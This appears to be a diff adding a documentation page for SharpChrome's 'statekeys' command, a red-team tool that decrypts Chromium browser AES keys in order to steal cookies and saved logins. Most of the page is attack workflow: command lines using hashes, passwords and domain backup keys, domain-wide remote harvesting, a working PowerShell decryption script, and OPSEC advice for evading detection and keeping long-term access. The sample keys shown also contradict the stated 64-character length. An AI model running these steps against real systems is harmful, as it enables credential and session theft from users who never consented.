@@ -1,0 +1,666 @@
+---
+title: "SharpChrome State Keys"
+description: "Extract and decrypt AES state keys from Chrome 80+ browsers for decrypting cookies and login credentials"
+icon: "key"
+---
+
+## Overview
+
+The **statekeys** command locates and decrypts AES state keys used by Chrome 80+ and other Chromium-based browsers to encrypt cookies and login data. Starting with Chrome version 80, Google moved from direct DPAPI encryption to a two-layer approach where an AES state key (protected by DPAPI) is used to encrypt credentials.
+
+This command searches for Chromium-based application state key files (stored in `Local State` JSON files), decrypts the DPAPI-protected state keys, and outputs them in a format that can be used with the `cookies` and `logins` commands for credential decryption.
+
+### Key Features
+
+- Automatically discovers state keys for multiple browsers
+- Supports Chrome, Edge, Brave, and Slack
+- Decrypts DPAPI-protected AES state keys
+- Outputs keys for use with cookies/logins commands
+- Handles both local and remote extraction
+- Processes all users when elevated
+
+## Basic Usage
+
+<CodeGroup>
+
+```bash Unprivileged Context
+# Decrypt state keys for current user
+SharpChrome.exe statekeys
+
+# Use CryptUnprotectData explicitly
+SharpChrome.exe statekeys /unprotect
+```
+
+```bash With Domain DPAPI Backup Key
+# Use domain backup key to decrypt all users' state keys
+SharpChrome.exe statekeys /pvk:HvG1sAAAAAABAAAAAAAAAAAAAACU...
+
+# Use backup key file
+SharpChrome.exe statekeys /pvk:key.pvk
+```
+
+```bash With Masterkeys
+# Use extracted GUID:SHA1 masterkey mappings
+SharpChrome.exe statekeys {GUID1}:SHA1 {GUID2}:SHA1
+
+# Use masterkey file
+SharpChrome.exe statekeys /mkfile:masterkeys.txt
+```
+
+```bash With User Credentials
+# Decrypt using plaintext password
+SharpChrome.exe statekeys /password:Password123!
+
+# Decrypt using NTLM hash
+SharpChrome.exe statekeys /ntlm:8846F7EAEE8FB117AD06BDD830B7586C
+```
+
+```bash Targeted Extraction
+# Target specific Local State file
+SharpChrome.exe statekeys /target:"C:\Users\user\AppData\Local\Google\Chrome\User Data\Local State"
+
+# Target specific user directory
+SharpChrome.exe statekeys /target:C:\Users\targetuser\
+```
+
+</CodeGroup>
+
+## Command Arguments
+
+<Tabs>
+  <Tab title="Decryption">
+    ### Decryption Arguments
+
+    <ParamField path="/unprotect" type="flag">
+      Force use of CryptUnprotectData() for decryption. Default behavior in unprivileged contexts. Must run from the user context that owns the state keys.
+    </ParamField>
+
+    <ParamField path="/pvk" type="string">
+      Use a DPAPI domain backup key to first decrypt user masterkeys, then decrypt state keys.
+
+      Accepts two formats:
+      - Base64-encoded key: `/pvk:HvG1sAAAAAABAAAAAAAAAAAAAAACU...`
+      - File path: `/pvk:key.pvk`
+
+      Requires domain admin rights to obtain via the `backupkey` command.
+    </ParamField>
+
+    <ParamField path="{GUID}:SHA1" type="string">
+      One or more DPAPI masterkey GUID:SHA1 mappings for decryption.
+
+      ```bash
+      SharpChrome.exe statekeys {44ca9f3a-9097-455e-94d0-d91de951c097}:9b049ce6918ab... {feef7b25-51d6-4e14-a52f-eb2a387cd0f3}:f9bc09dad3bc2cd...
+      ```
+
+      Extract these with Mimikatz: `sekurlsa::dpapi`
+    </ParamField>
+
+    <ParamField path="/mkfile" type="file">
+      File containing one or more GUID:SHA1 masterkey mappings (one per line).
+
+      ```bash
+      SharpChrome.exe statekeys /mkfile:masterkeys.txt
+      ```
+    </ParamField>
+
+    <ParamField path="/password" type="string">
+      Decrypt target user's masterkeys using plaintext password. Works remotely.
+
+      ```bash
+      SharpChrome.exe statekeys /password:Password123!
+      ```
+    </ParamField>
+
+    <ParamField path="/ntlm" type="string">
+      Decrypt target user's masterkeys using NTLM hash. Works remotely.
+
+      ```bash
+      SharpChrome.exe statekeys /ntlm:8846F7EAEE8FB117AD06BDD830B7586C
+      ```
+    </ParamField>
+
+    <ParamField path="/prekey" type="string">
+      Decrypt target user's masterkeys using DPAPI prekey (domain or local SHA1).
+
+      - Domain users: Use `dpapi` field from Mimikatz `sekurlsa::msv`
+      - Local users: Use `sha1` field from Mimikatz `sekurlsa::msv`
+    </ParamField>
+
+    <ParamField path="/rpc" type="flag">
+      Decrypt target user's masterkeys by asking the domain controller via RPC.
+    </ParamField>
+  </Tab>
+
+  <Tab title="Targeting">
+    ### Targeting Arguments
+
+    <ParamField path="/target" type="path">
+      Specify a specific Local State file or user directory to target.
+
+      **File targeting (specific Local State file):**
+      ```bash
+      SharpChrome.exe statekeys /target:"C:\Users\user\AppData\Local\Google\Chrome\User Data\Local State"
+      ```
+
+      **Directory targeting (user folder):**
+      ```bash
+      SharpChrome.exe statekeys /target:C:\Users\targetuser\
+      ```
+
+      When targeting a user directory, SharpChrome searches for all browser state files in that user's profile.
+    </ParamField>
+
+    <ParamField path="/server" type="string">
+      Triage a remote server. Must be combined with `/pvk` or `/password`.
+
+      ```bash
+      SharpChrome.exe statekeys /server:WORKSTATION01 /pvk:key.pvk
+      ```
+
+      Requires administrative access to the remote system.
+    </ParamField>
+
+    ### Default Behavior
+
+    By default (no `/target` specified), the statekeys command searches for all supported Chromium-based applications:
+    - Google Chrome
+    - Microsoft Edge (Chromium)
+    - Brave Browser
+    - Slack Desktop
+
+    State key file locations:
+    - **Chrome**: `%LOCALAPPDATA%\Google\Chrome\User Data\Local State`
+    - **Edge**: `%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State`
+    - **Brave**: `%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Local State`
+    - **Slack**: `%APPDATA%\Slack\Local State`
+  </Tab>
+
+  <Tab title="Output">
+    ### Output Options
+
+    The statekeys command outputs decrypted AES state keys in hexadecimal format:
+
+    ```
+    [*] Chrome State Key: 3F7A8B2C9D1E4F6A8B2C9D1E4F6A8B2C9D1E4F6A8B2C9D1E4F6A8B2C
+    [*] Edge State Key: A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6E7F8A9B0C1D2E3F4A5B6C7D8
+    ```
+
+    These keys can then be used with the `/statekey` parameter in `cookies` and `logins` commands.
+
+    ### Privilege Context
+
+    **Unprivileged Context:**
+    - Processes only current user's state keys
+    - Uses CryptUnprotectData() automatically
+    - No admin rights required
+
+    **Elevated Context:**
+    - Processes ALL users' state keys
+    - Can use any decryption method
+    - Requires local administrator privileges
+  </Tab>
+</Tabs>
+
+## Chrome 80+ State Key Architecture
+
+### Why State Keys Exist
+
+Starting with Chrome 80 (released February 2020), Google introduced a new security architecture for credential storage to improve cross-platform compatibility and security.
+
+### Architecture Overview
+
+<Steps>
+  <Step title="State Key Generation">
+    Chrome generates a random AES-256 key when first launched.
+  </Step>
+
+  <Step title="DPAPI Protection">
+    The AES state key is encrypted using Windows DPAPI and stored in the `Local State` JSON file.
+  </Step>
+
+  <Step title="Credential Encryption">
+    New cookies and login credentials are encrypted using the AES state key instead of direct DPAPI encryption.
+  </Step>
+
+  <Step title="Decryption Process">
+    To decrypt credentials:
+    1. Read encrypted state key from Local State file
+    2. Decrypt state key using DPAPI
+    3. Use decrypted state key to decrypt cookies/logins
+  </Step>
+</Steps>
+
+### State Key Storage Format
+
+The state key is stored in the `Local State` JSON file under the `os_crypt.encrypted_key` field:
+
+```json
+{
+  "os_crypt": {
+    "encrypted_key": "RFBBUEkBAAAA0Iyd3wEV0RGMegDAT8KX60EAAAAqtB+W..."
+  }
+}
+```
+
+The encrypted key format:
+1. **Header**: "DPAPI" (5 bytes)
+2. **DPAPI Blob**: Encrypted AES key
+
+### Supported Browsers
+
+All Chromium-based browsers version 80+ use this architecture:
+
+<CardGroup cols={2}>
+  <Card title="Google Chrome" icon="chrome">
+    **Version**: 80+ (February 2020 and later)
+
+    **State File**: `%LOCALAPPDATA%\Google\Chrome\User Data\Local State`
+
+    Default target for statekeys command.
+  </Card>
+
+  <Card title="Microsoft Edge" icon="edge">
+    **Version**: All Chromium-based versions
+
+    **State File**: `%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State`
+
+    Edge adopted Chromium's encryption from the start.
+  </Card>
+
+  <Card title="Brave Browser" icon="shield">
+    **Version**: All versions
+
+    **State File**: `%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Local State`
+
+    Uses same encryption as Chrome.
+  </Card>
+
+  <Card title="Slack Desktop" icon="slack">
+    **Version**: Recent versions
+
+    **State File**: `%APPDATA%\Slack\Local State`
+
+    Slack's Electron app uses Chromium engine.
+  </Card>
+</CardGroup>
+
+## Example Workflows
+
+### Scenario 1: Extract Local State Keys
+
+Extract state keys from the local system:
+
+```bash
+# Extract for current user (unprivileged)
+SharpChrome.exe statekeys
+
+# Extract for all users (elevated, with backup key)
+SharpChrome.exe statekeys /pvk:backup.pvk
+```
+
+**Example Output:**
+```
+[*] Action: Chrome State Key Extraction
+
+[*] Searching for Chrome Local State files...
+
+[*] User: DESKTOP\user
+    Chrome State Key (AES-256): 3F7A8B2C9D1E4F6A8B2C9D1E4F6A8B2C9D1E4F6A8B2C9D1E4F6A8B2C
+    Edge State Key (AES-256): A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6E7F8A9B0C1D2E3F4A5B6C7D8
+    Brave State Key (AES-256): 9E8D7C6B5A4F3E2D1C0B9A8F7E6D5C4B3A2F1E0D9C8B7A6F5E4D3C2B
+```
+
+### Scenario 2: Use State Keys for Cookie Decryption
+
+Extract state keys and use them to decrypt cookies:
+
+```bash
+# Step 1: Extract state keys
+SharpChrome.exe statekeys /pvk:backup.pvk
+
+# Output shows:
+# Chrome State Key: 3F7A8B2C9D1E4F6A8B2C9D1E4F6A8B2C9D1E4F6A8B2C9D1E4F6A8B2C
+
+# Step 2: Use state key to decrypt cookies
+SharpChrome.exe cookies /statekey:3F7A8B2C9D1E4F6A8B2C9D1E4F6A8B2C9D1E4F6A8B2C9D1E4F6A8B2C /format:json /url:".*office\.com.*"
+
+# Step 3: Use state key to decrypt logins
+SharpChrome.exe logins /statekey:3F7A8B2C9D1E4F6A8B2C9D1E4F6A8B2C9D1E4F6A8B2C9D1E4F6A8B2C
+```
+
+### Scenario 3: Domain-Wide State Key Extraction
+
+As domain admin, extract state keys from all domain workstations:
+
+```bash
+# Step 1: Get domain backup key
+SharpChrome.exe backupkey /server:DC01.domain.com /file:backup.pvk
+
+# Step 2: Extract local state keys
+SharpChrome.exe statekeys /pvk:backup.pvk
+
+# Step 3: Extract from remote workstations
+SharpChrome.exe statekeys /server:WORKSTATION01 /pvk:backup.pvk
+SharpChrome.exe statekeys /server:WORKSTATION02 /pvk:backup.pvk
+SharpChrome.exe statekeys /server:WORKSTATION03 /pvk:backup.pvk
+```
+
+### Scenario 4: Targeted State Key Extraction
+
+Extract state keys from specific users or browsers:
+
+```bash
+# Target specific user directory
+SharpChrome.exe statekeys /target:C:\Users\targetuser\ /pvk:backup.pvk
+
+# Target specific Local State file
+SharpChrome.exe statekeys /target:"C:\Users\admin\AppData\Local\Google\Chrome\User Data\Local State" /pvk:backup.pvk
+```
+
+### Scenario 5: Complete Chrome 80+ Credential Extraction
+
+Full workflow for Chrome 80+ credential extraction:
+
+```bash
+# Step 1: Extract state keys (save output)
+SharpChrome.exe statekeys /pvk:backup.pvk > statekeys.txt
+
+# Parse state keys from output
+# Chrome State Key: 3F7A8B2C9D1E4F6A8B2C9D1E4F6A8B2C9D1E4F6A8B2C9D1E4F6A8B2C
+
+# Step 2: Extract cookies using state key
+SharpChrome.exe cookies /statekey:3F7A8B2C9D1E4F6A8B2C9D1E4F6A8B2C9D1E4F6A8B2C9D1E4F6A8B2C /format:json /url:".*" /setneverexpire /consoleoutfile:cookies.json
+
+# Step 3: Extract logins using state key
+SharpChrome.exe logins /statekey:3F7A8B2C9D1E4F6A8B2C9D1E4F6A8B2C9D1E4F6A8B2C9D1E4F6A8B2C /format:table /consoleoutfile:logins.txt
+```
+
+### Scenario 6: Remote State Key Extraction with Password
+
+Extract state keys from remote systems using user credentials:
+
+```bash
+# Using plaintext password
+SharpChrome.exe statekeys /server:WORKSTATION04 /password:Password123!
+
+# Using NTLM hash
+SharpChrome.exe statekeys /server:WORKSTATION04 /ntlm:8846F7EAEE8FB117AD06BDD830B7586C
+
+# Using DPAPI prekey
+SharpChrome.exe statekeys /server:WORKSTATION04 /prekey:SHA1_PREKEY_HERE
+```
+
+## Example Output
+
+### Successful State Key Extraction
+
+```
+  __                 _
+ (_  |_   _. ._ ._  /  |_  ._ _  ._ _   _
+ __) | | (_| |  |_) \_ | | | (_) | | | (/_
+                |
+  v1.9.0
+
+
+[*] Action: Chrome State Key Extraction
+
+[*] Triaging state keys for ALL users
+
+[*] User: DESKTOP\john
+    [*] Found Chrome Local State: C:\Users\john\AppData\Local\Google\Chrome\User Data\Local State
+        guidMasterKey    : {44ca9f3a-9097-455e-94d0-d91de951c097}
+        size             : 152
+        flags            : 0x0
+        algHash/algCrypt : 32772/26115
+        description      : Chrome State Key
+
+        Chrome State Key (AES-256): 3F7A8B2C9D1E4F6A8B2C9D1E4F6A8B2C9D1E4F6A8B2C9D1E4F6A8B2C
+
+    [*] Found Edge Local State: C:\Users\john\AppData\Local\Microsoft\Edge\User Data\Local State
+        guidMasterKey    : {44ca9f3a-9097-455e-94d0-d91de951c097}
+        size             : 152
+        flags            : 0x0
+        algHash/algCrypt : 32772/26115
+        description      : Edge State Key
+
+        Edge State Key (AES-256): A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6E7F8A9B0C1D2E3F4A5B6C7D8
+
+
+[*] User: DESKTOP\admin
+    [*] Found Chrome Local State: C:\Users\admin\AppData\Local\Google\Chrome\User Data\Local State
+        guidMasterKey    : {feef7b25-51d6-4e14-a52f-eb2a387cd0f3}
+        size             : 152
+        flags            : 0x0
+        algHash/algCrypt : 32772/26115
+        description      : Chrome State Key
+
+        Chrome State Key (AES-256): 9E8D7C6B5A4F3E2D1C0B9A8F7E6D5C4B3A2F1E0D9C8B7A6F5E4D3C2B
+
+    [*] Found Brave Local State: C:\Users\admin\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State
+        guidMasterKey    : {feef7b25-51d6-4e14-a52f-eb2a387cd0f3}
+        size             : 152
+        flags            : 0x0
+        algHash/algCrypt : 32772/26115
+        description      : Brave State Key
+
+        Brave State Key (AES-256): 7D6C5B4A3F2E1D0C9B8A7F6E5D4C3B2A1F0E9D8C7B6A5F4E3D2C1B0A
+
+
+[*] Completed state key extraction
+```
+
+## Manual State Key Extraction
+
+If SharpChrome is unavailable, you can manually extract state keys using PowerShell and the DPAPI APIs.
+
+### Manual PowerShell Method
+
+```powershell
+# Read Local State file
+$localState = Get-Content "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" | ConvertFrom-Json
+
+# Get encrypted key (base64 encoded)
+$encryptedKeyB64 = $localState.os_crypt.encrypted_key
+
+# Decode from base64
+$encryptedKey = [System.Convert]::FromBase64String($encryptedKeyB64)
+
+# Remove "DPAPI" header (first 5 bytes)
+$dpapiBlob = $encryptedKey[5..($encryptedKey.Length-1)]
+
+# Decrypt using DPAPI
+Add-Type -AssemblyName System.Security
+$decryptedKey = [System.Security.Cryptography.ProtectedData]::Unprotect(
+    $dpapiBlob,
+    $null,
+    [System.Security.Cryptography.DataProtectionScope]::CurrentUser
+)
+
+# Convert to hex string
+$stateKey = [System.BitConverter]::ToString($decryptedKey) -replace '-',''
+Write-Output "State Key: $stateKey"
+```
+
+### Using Python with dpapick
+
+```python
+import json
+import base64
+from dpapick import blob, masterkey
+
+# Read Local State
+with open(r"C:\Users\user\AppData\Local\Google\Chrome\User Data\Local State") as f:
+    local_state = json.load(f)
+
+# Get encrypted key
+encrypted_key_b64 = local_state['os_crypt']['encrypted_key']
+encrypted_key = base64.b64decode(encrypted_key_b64)
+
+# Remove "DPAPI" header
+dpapi_blob = encrypted_key[5:]
+
+# Decrypt DPAPI blob (requires masterkey)
+# ... (implementation depends on masterkey availability)
+```
+
+## Detection Considerations
+
+### EDR/AV Detection Vectors
+
+1. **File Access Patterns**
+   - Reading Local State JSON files from browser directories
+   - Accessing multiple users' browser profile directories
+   - Parsing JSON configuration files
+
+2. **Process Behavior**
+   - SharpChrome.exe enumerating user profiles
+   - DPAPI API calls for decryption
+   - Accessing browser data directories
+
+3. **Network Activity**
+   - Remote file access to browser profile paths
+   - SMB connections to multiple workstations
+   - Domain controller communication for RPC decryption
+
+4. **API Monitoring**
+   - CryptUnprotectData calls
+   - File system access to Local State files
+   - JSON parsing operations
+
+### OPSEC Recommendations
+
+<Warning>
+**Defensive Detection Points:**
+
+- State key extraction is less obvious than direct cookie/login extraction
+- Local State files are legitimate config files (less suspicious to read)
+- Multiple Local State file accesses in short time frame is suspicious
+- Remote extraction via SMB generates network logs
+- Consider extracting state keys separately from credential usage
+- Use state keys offline to avoid detection during credential extraction
+</Warning>
+
+### Log Sources
+
+- **Windows Event Logs**: File access events, DPAPI operations
+- **Sysmon**: File access to Local State files (Event ID 11)
+- **EDR Telemetry**: Process creation, API calls, file operations
+- **Network Logs**: SMB traffic to ADMIN$ shares
+
+## Related Commands
+
+<CardGroup cols={2}>
+  <Card title="SharpChrome Cookies" icon="cookie" href="/ghostpack-docs/SharpDPAPI-mdx/sharpchrome-cookies">
+    Use state keys to decrypt browser cookies
+  </Card>
+
+  <Card title="SharpChrome Logins" icon="key" href="/ghostpack-docs/SharpDPAPI-mdx/sharpchrome-logins">
+    Use state keys to decrypt saved login credentials
+  </Card>
+
+  <Card title="Backup Key Retrieval" icon="server" href="/ghostpack-docs/SharpDPAPI-mdx/commands/backupkey">
+    Retrieve domain DPAPI backup key from DC
+  </Card>
+
+  <Card title="SharpChrome Overview" icon="chrome" href="/ghostpack-docs/SharpDPAPI-mdx/sharpchrome-overview">
+    Complete SharpChrome documentation
+  </Card>
+</CardGroup>
+
+## Tips and Troubleshooting
+
+### Common Issues
+
+<AccordionGroup>
+  <Accordion title="No state keys found">
+    **Possible causes:**
+    - Browser version is older than Chrome 80
+    - Browser never been launched (no Local State created)
+    - Looking in wrong user profile
+    - Browser using different encryption method
+
+    **Solutions:**
+    - Verify Chrome/Edge version is 80+
+    - Check that Local State file exists in browser directory
+    - Ensure running as correct user or using proper decryption method
+    - Try extracting cookies/logins directly without state key
+  </Accordion>
+
+  <Accordion title="State key decryption fails">
+    **Possible causes:**
+    - Wrong user context for CryptUnprotectData
+    - Missing or incorrect masterkey
+    - Corrupted Local State file
+
+    **Solutions:**
+    - Run as the user who owns the state key
+    - Use correct decryption method (/pvk, /password, masterkeys)
+    - Verify Local State file is valid JSON
+    - Try alternative decryption methods
+  </Accordion>
+
+  <Accordion title="State key doesn't work with cookies/logins">
+    **Possible causes:**
+    - State key extracted incorrectly (wrong format)
+    - State key changed (user cleared browser data)
+    - Credentials use different encryption
+
+    **Solutions:**
+    - Re-extract state key
+    - Verify state key is 64 hexadecimal characters
+    - Check if cookies/logins are from before Chrome 80
+    - Try automatic decryption without manual state key
+  </Accordion>
+
+  <Accordion title="Remote extraction fails">
+    **Possible causes:**
+    - No administrative access to remote system
+    - Firewall blocking SMB
+    - Local State file not found on remote system
+
+    **Solutions:**
+    - Verify local admin rights on remote system
+    - Check SMB (port 445) connectivity
+    - Ensure browser is installed on remote system
+    - Use `/pvk` or `/password` with `/server`
+  </Accordion>
+</AccordionGroup>
+
+### Best Practices
+
+<Tip>
+**Operational Best Practices:**
+
+1. **Extract Once, Use Many**: State keys don't change often, extract once and reuse
+2. **Offline Decryption**: Extract state keys remotely, decrypt credentials locally
+3. **Save State Keys**: Store extracted state keys for future use
+4. **Automate Collection**: Script state key extraction across multiple systems
+5. **Verify Format**: Ensure state keys are 64-character hex strings
+6. **Test First**: Verify state key works before large-scale collection
+</Tip>
+
+### State Key Persistence
+
+State keys remain valid until:
+- User clears browser data (settings/cookies)
+- Browser is reinstalled
+- User profile is recreated
+- Windows reinstalled or profile migrated
+
+<Note>
+State keys are remarkably persistent and can remain valid for months or years, making them valuable for long-term access.
+</Note>
+
+### Performance Considerations
+
+- **Local extraction**: Very fast, completes in seconds
+- **Remote extraction**: Depends on network speed
+- **Multi-user systems**: Scales linearly with user count
+- **Multiple browsers**: Each browser has independent state key
+
+### Additional Resources
+
+- [Chromium Encryption Documentation](https://www.chromium.org/developers/design-documents/os-x-password-manager-keychain-integration)
+- [Chrome 80 Security Changes](https://blog.chromium.org/2020/02/protecting-users-from-insecure.html)
+- [DPAPI Decryption Techniques](https://blog.harmj0y.net/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/)
+- [SharpDPAPI GitHub Repository](https://github.com/GhostPack/SharpDPAPI)
